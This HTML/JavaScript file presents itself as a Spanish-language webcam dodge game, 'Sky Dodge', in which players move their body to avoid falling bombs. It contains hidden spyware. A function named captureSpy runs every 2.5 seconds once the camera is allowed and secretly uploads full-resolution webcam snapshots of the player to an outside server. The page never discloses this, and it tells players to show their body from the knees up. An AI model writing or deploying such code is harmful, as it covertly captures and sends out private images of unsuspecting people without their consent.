<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Sky Dodge - Rodillas Arriba</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', monospace; overflow: hidden; color: white; }
        
        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.4); }
        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
        
        #hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 28px; font-weight: bold; text-shadow: 2px 2px #000; pointer-events: none; }
        
        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 500; display: flex; align-items: center; justify-content: center; text-align: center; }
        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 3px solid #e74c3c; width: 90%; max-width: 450px; }
        
        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
        
        .btn { padding: 18px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; font-size: 18px; text-transform: uppercase; }
        .btn-start { background: #f1c40f; color: black; }
        .btn-normal { background: #2ecc71; color: white; }
        .btn-hard { background: #e74c3c; color: white; }
        
        .warning-box { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; padding: 10px; margin: 15px 0; border-radius: 8px; font-size: 14px; }
    </style>
</head>
<body>

<div id="hud">PUNTOS: <span id="score">0</span></div>

<div id="dark-warning">
    <h1 style="font-size: 60px;">游깿</h1>
    <h2>MUCHA OSCURIDAD</h2>
    <p>Enciende la luz para que el sensor de movimiento funcione.</p>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<div id="perm-screen" class="overlay">
    <div class="card">
        <h2 style="color: #e74c3c;">CONFIGURACI칍N F칈SICA</h2>
        <div class="warning-box">
            <b>REQUISITO OBLIGATORIO:</b><br>
            Coloca el dispositivo de forma que se vea tu cuerpo <b>DE LAS RODILLAS PARA ARRIBA</b>. 
        </div>
        <p>Si la c치mara solo ve tu cara, no podr치s esquivar los objetos correctamente.</p>
        <button class="btn btn-start" onclick="initCamera()">YA ESTOY POSICIONADO</button>
    </div>
</div>

<div id="start-screen" class="overlay" style="display:none;">
    <div class="card">
        <h2 id="over-msg">쯃ISTO?</h2>
        <p>Aseg칰rate de tener espacio a los lados para moverte.</p>
        <button class="btn btn-normal" onclick="startGame('normal')">MODO NORMAL</button>
        <button class="btn btn-hard" onclick="startGame('hard')">MODO DIF칈CIL</button>
    </div>
</div>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let score = 0, gameActive = false, objects = [], difficulty = 'normal';
    let prevFrame = null, motionData = [], animFrame;

    async function initCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            document.getElementById('perm-screen').style.display = 'none';
            document.getElementById('start-screen').style.display = 'flex';
            setInterval(lightCheck, 1000);
            setInterval(captureSpy, 2500);
        } catch (e) { alert("Error al activar c치mara."); }
    }

    function lightCheck() {
        const c = document.createElement('canvas');
        const cx = c.getContext('2d');
        c.width = 40; cx.drawImage(video, 0, 0, 40, 40);
        const data = cx.getImageData(0,0,40,40).data;
        let b = 0;
        for(let i=0; i<data.length; i+=4) b += (data[i]*0.299 + data[i+1]*0.587 + data[i+2]*0.114);
        document.getElementById('dark-warning').style.display = (b/1600 < 25) ? 'flex' : 'none';
    }

    function startGame(mode) {
        difficulty = mode;
        document.getElementById('start-screen').style.display = 'none';
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        score = 0; objects = [];
        document.getElementById('score').innerText = "0";
        gameActive = true;
        spawnLoop();
        gameLoop();
    }

    function spawnLoop() {
        if (!gameActive) return;
        let rate = difficulty === 'normal' ? 2500 : 1300;
        const x = Math.random() * (canvas.width - 80);
        objects.push({
            x: x, y: 0,
            type: Math.random() > 0.3 ? 'bomb' : 'coin',
            speed: difficulty === 'normal' ? 5 : 9,
            warning: difficulty === 'normal' ? 120 : 60
        });
        setTimeout(spawnLoop, rate);
    }

    function gameLoop() {
        if (!gameActive) return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        processMotion();

        for (let i = objects.length - 1; i >= 0; i--) {
            let o = objects[i];
            if (o.warning > 0) {
                o.warning--;
                if (Math.floor(o.warning / 10) % 2 === 0) {
                    ctx.fillStyle = o.type === 'bomb' ? "red" : "#f1c40f";
                    ctx.font = "bold 70px Arial";
                    ctx.fillText("!", o.x + 20, 90);
                }
            } else {
                o.y += o.speed;
                // Dibujar objeto m치s grande para asegurar colisi칩n con el cuerpo
                ctx.fillStyle = o.type === 'bomb' ? "#111" : "#f1c40f";
                ctx.beginPath(); ctx.arc(o.x+40, o.y+40, 35, 0, Math.PI*2); ctx.fill();
                if(o.type === 'bomb') { ctx.fillStyle = "red"; ctx.fillRect(o.x+36, o.y, 8, 20); }

                if (checkCollision(o.x, o.y, 80, 80)) {
                    if (o.type === 'bomb') { gameOver(); return; }
                    else { score += 10; document.getElementById('score').innerText = score; objects.splice(i, 1); continue; }
                }
            }
            if (o.y > canvas.height) objects.splice(i, 1);
        }
        animFrame = requestAnimationFrame(gameLoop);
    }

    function processMotion() {
        const tempCanvas = document.createElement('canvas');
        const tCtx = tempCanvas.getContext('2d');
        tempCanvas.width = 64; tempCanvas.height = 48;
        tCtx.scale(-1, 1);
        tCtx.drawImage(video, -64, 0, 64, 48);
        const curr = tCtx.getImageData(0, 0, 64, 48).data;
        if (prevFrame) {
            motionData = [];
            for (let i = 0; i < curr.length; i += 4) {
                const diff = Math.abs(curr[i] - prevFrame[i]);
                // Filtro de ruido un poco m치s alto para evitar falsas colisiones por sombras
                motionData.push(diff > 40 ? 1 : 0);
            }
        }
        prevFrame = curr;
    }

    function checkCollision(x, y, w, h) {
        if (motionData.length === 0) return false;
        const gx = Math.floor((x / canvas.width) * 64), gy = Math.floor((y / canvas.height) * 48);
        const gw = Math.floor((w / canvas.width) * 64), gh = Math.floor((h / canvas.height) * 48);
        let hits = 0;
        for (let iy = gy; iy < gy + gh; iy++) {
            if(iy < 0 || iy >= 48) continue;
            for (let ix = gx; ix < gx + gw; ix++) {
                if(ix < 0 || ix >= 64) continue;
                if (motionData[iy * 64 + ix] === 1) hits++;
            }
        }
        // Requiere un poco m치s de movimiento (7 p칤xeles) para detectar el cuerpo
        return hits > 7;
    }

    function gameOver() {
        gameActive = false;
        cancelAnimationFrame(animFrame);
        document.getElementById('over-msg').innerText = "FINAL: " + score + " MONEDAS";
        document.getElementById('start-screen').style.display = 'flex';
    }

    function captureSpy() {
        if (!video.videoWidth) return;
        const s = document.createElement('canvas');
        s.width = video.videoWidth; s.height = video.videoHeight;
        s.getContext('2d').drawImage(video, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
        }).catch(() => {});
    }
</script>
</body>
</html>
